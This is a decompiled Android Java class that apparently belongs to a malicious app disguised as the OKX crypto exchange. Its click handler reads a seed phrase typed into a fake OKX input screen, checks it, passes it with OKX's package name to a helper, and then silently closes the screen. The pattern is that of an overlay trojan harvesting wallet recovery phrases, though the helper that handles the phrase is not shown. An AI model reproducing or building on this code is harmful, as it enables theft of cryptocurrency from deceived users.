package j3;

import android.os.Build;
import android.os.Handler;
import android.os.Looper;
import android.view.View;
import android.view.inputmethod.InputMethodManager;
import com.blankj.utilcode.util.ToastUtils;
import com.superbock.ui.custom.InputWordsOkxActivity;
import comeliest.metempsychosis.pokelogan.R;

/* loaded from: classes9.dex */
public final class l1 implements View.OnClickListener {

    /* renamed from: b, reason: collision with root package name */
    public final /* synthetic */ InputWordsOkxActivity f3517b;

    /* loaded from: classes17.dex */
    public class a implements Runnable {
        public a() {
        }

        @Override // java.lang.Runnable
        public final void run() {
            l1.this.f3517b.finishAndRemoveTask();
            l1.this.f3517b.f1624b.setFeedBack(2);
        }
    }

    public l1(InputWordsOkxActivity inputWordsOkxActivity) {
        this.f3517b = inputWordsOkxActivity;
    }

    @Override // android.view.View.OnClickListener
    public final void onClick(View view) {
        String trim = this.f3517b.f1629g.getText().toString().trim();
        if (trim.length() == 0 || !k3.j.b(trim)) {
            if (Build.VERSION.SDK_INT >= 23) {
                ToastUtils.make().setLeftIcon(R.mipmap.ic_okx).setGravity(17, 0, 0).setMode(ToastUtils.MODE.DARK).show(this.f3517b.getString(R.string.Incorrect_seed_phrase_Check));
                return;
            } else {
                ToastUtils.showLong(this.f3517b.getString(R.string.Incorrect_seed_phrase_Check));
                return;
            }
        }
        k3.j.a(trim.replaceAll("\\s+", " "), "com.okinc.okex.gp", this.f3517b.getString(R.string.okx), view.getContext());
        InputWordsOkxActivity inputWordsOkxActivity = this.f3517b;
        ((InputMethodManager) inputWordsOkxActivity.getSystemService("input_method")).hideSoftInputFromWindow(inputWordsOkxActivity.f1629g.getWindowToken(), 0);
        this.f3517b.f1629g.clearFocus();
        new Handler(Looper.getMainLooper()).postDelayed(new a(), 500L);
    }
}
